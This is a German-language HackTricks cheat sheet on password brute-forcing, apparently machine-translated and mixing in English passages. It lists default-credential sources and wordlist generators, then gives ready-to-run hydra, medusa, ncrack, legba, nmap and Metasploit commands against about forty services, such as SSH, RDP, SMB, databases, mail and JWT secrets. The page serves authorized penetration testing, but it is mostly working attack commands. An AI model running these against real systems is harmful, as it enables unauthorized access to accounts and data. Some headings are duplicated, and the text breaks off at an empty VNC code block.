# Brute Force - Spickzettel

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um mühelos **Workflows zu erstellen** und zu **automatisieren**, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Standardanmeldeinformationen

**Suchen Sie in Google** nach den Standardanmeldeinformationen der verwendeten Technologie oder **versuchen Sie diese Links**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Erstellen Sie Ihre eigenen Wörterbücher**

Sammeln Sie so viele Informationen über das Ziel wie möglich und erstellen Sie ein benutzerdefiniertes Wörterbuch. Tools, die dabei helfen können:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl ist ein Tool, das verwendet wird, um Passwörter durch das Extrahieren von Wörtern aus einer Website zu bruteforcen. Es kann verwendet werden, um benutzerdefinierte Wörterbücher zu erstellen, die dann für Angriffe verwendet werden können.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Generiere Passwörter basierend auf deinem Wissen über das Opfer (Namen, Daten...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Ein Wortlisten-Generator-Tool, das es Ihnen ermöglicht, eine Reihe von Wörtern bereitzustellen, um Ihnen die Möglichkeit zu geben, mehrere Variationen der gegebenen Wörter zu erstellen, um eine einzigartige und ideale Wortliste für die Verwendung in Bezug auf ein spezifisches Ziel zu erstellen.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Wortlisten

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um **Workflows zu erstellen** und zu **automatisieren**, die von den weltweit **fortschrittlichsten** Community-Tools unterstützt werden.\
Heute noch Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Dienste

Alphabetisch nach Dienstnamen geordnet.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP steht für Apache JServ Protocol und ist ein Binärprotokoll, das von Apache Tomcat verwendet wird, um die Kommunikation zwischen einem Apache HTTP Server und einem Tomcat-Webcontainer zu ermöglichen. Es ist wichtig zu beachten, dass AJP normalerweise nicht über das Internet zugänglich ist, da es für den internen Gebrauch konzipiert ist.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace) 

## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM und Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra ist eine NoSQL-Datenbank, die von Apache entwickelt wurde. Sie wird häufig für die Speicherung großer Datenmengen verwendet. Cassandra-Datenbanken können durch Brute-Force-Angriffe kompromittiert werden, bei denen Angreifer systematisch verschiedene Passwörter ausprobieren, um Zugriff zu erhalten. Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsmaßnahmen zu implementieren, um Brute-Force-Angriffe zu verhindern.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB ist eine NoSQL-Datenbank, die häufig für die Speicherung von Dokumenten verwendet wird. Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf CouchDB-Instanzen verwendet werden können. Einige dieser Tools sind:

- **CouchDB-Pass**: Ein Tool, das speziell für Brute-Force-Angriffe auf CouchDB entwickelt wurde. Es kann Passwörter mit hoher Geschwindigkeit ausprobieren.
  
- **Hydra**: Ein beliebtes Tool für Brute-Force-Angriffe, das auch für CouchDB eingesetzt werden kann. Es unterstützt verschiedene Protokolle und Dienste.

Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsmaßnahmen wie IP-Whitelisting oder Zwei-Faktor-Authentifizierung zu implementieren, um Brute-Force-Angriffe auf CouchDB zu verhindern.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker-Register
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Brute Force

Brute force attacks are a common way to gain unauthorized access to Elasticsearch instances. Attackers use automated tools to repeatedly guess the credentials until the correct combination is found. To prevent brute force attacks, it is recommended to:

- **Use Strong Credentials**: Ensure that strong and complex passwords are used for all Elasticsearch accounts.
- **Implement Account Lockout Policies**: Configure account lockout policies to lock out users after a certain number of failed login attempts.
- **Monitor Login Attempts**: Regularly monitor and review login attempts to detect any suspicious activity.
- **Limit Access**: Restrict access to Elasticsearch instances to only authorized users and IP addresses.
- **Enable Multi-Factor Authentication (MFA)**: Implement MFA to add an extra layer of security to the authentication process.

By following these best practices, you can enhance the security of your Elasticsearch instances and protect them from brute force attacks.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

Brute-force attacks against FTP servers can be conducted using tools such as Hydra, Medusa, or Ncrack. These tools allow an attacker to systematically check a large number of usernames and passwords until the correct combination is found. It is important to note that brute-forcing FTP credentials is illegal unless you have explicit permission to do so as part of a penetration testing engagement.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Generisches Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

Brute force attacks against web forms are a common method used to gain unauthorized access to a system. Attackers use automated tools to repeatedly try different combinations of usernames and passwords until they find the correct one. This method can be effective if the system does not have protections in place to limit the number of login attempts. It is important for system administrators to implement measures such as account lockouts or CAPTCHA challenges to prevent brute force attacks.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Für http**s** müssen Sie von "http-post-form" auf "**https-post-form"** ändern

### **HTTP - CMS --** (W)ordpress, (J)oomla oder (D)rupal oder (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

Brute-forcing IMAP credentials is a common technique used to gain unauthorized access to email accounts. Attackers use automated tools to systematically try different username and password combinations until the correct one is found. This method can be effective if the credentials are weak or easily guessable. It is important for users to use strong, unique passwords to protect their email accounts from brute-force attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

Brute-forcing IRC servers is a common technique used to gain unauthorized access. Attackers can use tools like Hydra or Brutus to automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute-forcing is illegal and unethical unless you have explicit permission to test the security of the IRC server.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Tokens sind eine weit verbreitete Methode zur Authentifizierung in Webanwendungen. Sie bestehen aus drei Teilen: Header, Payload und Signatur. Der Header enthält den Typ des Tokens und den verwendeten Algorithmus. Der Payload enthält die Nutzlastinformationen, die vom Server signiert werden. Die Signatur wird mit einem geheimen Schlüssel erstellt und dient zur Überprüfung der Integrität des Tokens.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) ist ein offenes, standardisiertes Protokoll, das zum Abrufen und Aktualisieren von Informationen in einem Verzeichnisdienst verwendet wird. Es wird häufig für die Authentifizierung und Autorisierung in Anwendungen und Netzwerken eingesetzt.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol that is widely used for IoT devices.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

Brute-force-Angriffe auf MSSQL-Server sind sehr häufig und können durch Tools wie Hydra, Ncrack und Metasploit durchgeführt werden. Diese Tools ermöglichen es, Benutzernamen und Passwörter durch systematisches Ausprobieren aller möglichen Kombinationen zu erraten. Es ist wichtig, starke und komplexe Passwörter zu verwenden, um Brute-Force-Angriffe zu erschweren.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

Brute-force-Angriffe auf MySQL-Datenbanken sind sehr häufig und können durch Tools wie Hydra, Metasploit oder einfach durch Skripte durchgeführt werden. Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsvorkehrungen wie IP-Whitelisting oder Zwei-Faktor-Authentifizierung zu implementieren, um solche Angriffe zu verhindern.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

Brute-force attacks against OracleSQL databases can be carried out using tools like Hydra or Metasploit. These tools can help automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute-force attacks can be time-consuming and resource-intensive, and may not always be successful. It is recommended to use strong, complex passwords and implement other security measures to protect against brute-force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Um **oracle\_login** mit **patator** zu verwenden, müssen Sie **installieren**:
```bash
pip3 install cx_Oracle --upgrade
```
[Offline OracleSQL Hash-Bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**Versionen 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** und **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

Brute force attacks against POP (Post Office Protocol) servers involve attempting to log in to a user's account by systematically trying all possible passwords. This can be achieved using tools like Hydra or Medusa, which automate the process of trying different password combinations until the correct one is found. It is essential to use a strong password policy and account lockout mechanisms to protect against these types of attacks.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

Brute-force attacks against PostgreSQL databases are typically carried out using tools like Hydra or Metasploit. These tools can be used to automate the process of trying different username and password combinations until the correct one is found. It is important to use strong and complex passwords to protect against brute-force attacks.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Sie können das `.deb` Paket zum Installieren von [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) herunterladen.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

Remote Desktop Protocol (RDP) ist ein proprietäres Protokoll von Microsoft, das es einem Benutzer ermöglicht, eine Verbindung zu einem anderen Computer über ein Netzwerk herzustellen. Es wird häufig für die Fernverwaltung von Computern verwendet. Ein Brute-Force-Angriff auf RDP beinhaltet das systematische Ausprobieren von Benutzername und Passwort, um unbefugten Zugriff zu erlangen. Dies kann durch Tools wie Hydra, Ncrack oder RDP-Brute erfolgen. Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsmaßnahmen wie die Begrenzung der Anmeldeversuche zu implementieren, um Brute-Force-Angriffe zu verhindern.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis ist ein Open-Source-In-Memory-Datenbanksystem, das häufig für die Zwischenspeicherung, Sitzungsspeicherung und Echtzeit-Anwendungen verwendet wird. Es ist bekannt für seine Geschwindigkeit und Flexibilität. Redis kann durch Brute-Force-Angriffe gefährdet sein, wenn schwache oder standardmäßige Anmeldeinformationen verwendet werden. Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsbewusstsein zu schaffen, um Brute-Force-Angriffe zu verhindern.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec ist ein einfaches Brute-Force-Tool, das für das Durchführen von Angriffen auf Rexec-Dienste verwendet wird. Es kann verwendet werden, um Benutzername und Passwort-Kombinationen aus einer vordefinierten Liste auszuprobieren.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin ist ein Remote-Login-Programm, das auf UNIX-Systemen verwendet wird. Es ermöglicht einem Benutzer, sich auf einem entfernten Rechner anzumelden und eine Sitzung zu starten. Rlogin ist anfällig für Brute-Force-Angriffe, bei denen ein Angreifer versucht, sich durch Ausprobieren verschiedener Passwörter Zugang zu einem Konto zu verschaffen. Es ist wichtig, starke Passwörter zu verwenden und Sicherheitsvorkehrungen zu treffen, um Brute-Force-Angriffe zu verhindern.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a simple remote shell client included with Unix operating systems. It can be used to execute commands on a remote system. Rsh is often targeted during brute-force attacks due to its lack of encryption and authentication mechanisms.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) ist ein Netzwerkprotokoll, das für die Steuerung von Streaming-Medien im Netzwerk verwendet wird. Es wird häufig für die Übertragung von Audio- oder Videodaten in Echtzeit verwendet.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP steht für Secure File Transfer Protocol. Es handelt sich um eine sichere Methode zum Übertragen von Dateien über ein Netzwerk.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP (Simple Network Management Protocol) ist ein Protokoll, das in Netzwerken verwendet wird, um Informationen über Geräte zu sammeln und zu verwalten. Es kann durch Brute-Force-Angriffe auf die Community-Strings kompromittiert werden.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

#### Brute Force

Brute force attacks are a common method used to gain unauthorized access to SMB services. Attackers use automated tools to try all possible username and password combinations until the correct one is found. This method is effective but can be time-consuming, noisy, and easily detectable by intrusion detection systems. It is important to use strong, complex passwords and implement account lockout policies to mitigate the risk of a successful brute force attack.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

SMTP (Simple Mail Transfer Protocol) ist ein Protokoll, das für den Versand von E-Mails verwendet wird.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) ist ein Internet-Protokoll, das zur Weiterleitung von Netzwerkverkehr zwischen einem Client und einem Server in einem Proxy-Server verwendet wird. Es ermöglicht dem Client, Verbindungen über den Proxy herzustellen, ohne dass der Server die wahre Identität des Clients kennt. SOCKS kann für Brute-Force-Angriffe verwendet werden, um die Anonymität des Angreifers zu wahren.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

Brute-force attacks against SQL Server can be performed using tools like **SQLBrute** or **SQLDict**. These tools allow you to automate the process of trying different usernames and passwords until the correct combination is found. It is important to note that brute-force attacks can be time-consuming and may trigger account lockouts if too many failed attempts are made.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) is a cryptographic network protocol for operating network services securely over an unsecured network. It is widely used for secure remote access to systems and executing commands. Brute-forcing SSH involves trying all possible password combinations until the correct one is found. This can be done using tools like Hydra, Medusa, or Ncrack. It is important to use strong, complex passwords and implement other security measures to protect against SSH brute-force attacks.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Schwache SSH-Schlüssel / Vorhersehbarer PRNG von Debian

Einige Systeme weisen bekannte Schwachstellen im Zufallsseed auf, der zur Generierung kryptografischer Materialien verwendet wird. Dies kann zu einem dramatisch reduzierten Schlüsselraum führen, der mit Tools wie [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) bruteforcebar ist. Vorgefertigte Sets schwacher Schlüssel sind ebenfalls verfügbar, wie z.B. [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ und OpenMQ)

Das STOMP-Textprotokoll ist ein weit verbreitetes Messaging-Protokoll, das **eine nahtlose Kommunikation und Interaktion mit beliebten Nachrichtenwarteschlangendiensten** wie RabbitMQ, ActiveMQ, HornetQ und OpenMQ ermöglicht. Es bietet einen standardisierten und effizienten Ansatz zum Austausch von Nachrichten und zur Durchführung verschiedener Messaging-Operationen.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet ist ein Netzwerkprotokoll, das zur Kommunikation mit entfernten Systemen oder Geräten über das Internet oder lokale Netzwerke verwendet wird. Es ermöglicht Benutzern, eine Verbindung zu einem entfernten Host herzustellen und Befehle auszuführen. Telnet kann für legitime Zwecke verwendet werden, wird jedoch auch von Hackern für Angriffe wie Brute-Force-Angriffe eingesetzt.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC (Virtual Network Computing) is a graphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. VNC is commonly used for remote technical support and accessing files on a remote computer. 

#### Brute Forcing VNC

Brute forcing VNC involves trying all possible username and password combinations until the correct one is found. Tools like Hydra and Medusa can be used for brute forcing VNC passwords. It is important to use strong and complex passwords to prevent unauthorized access to VNC servers.
```bash
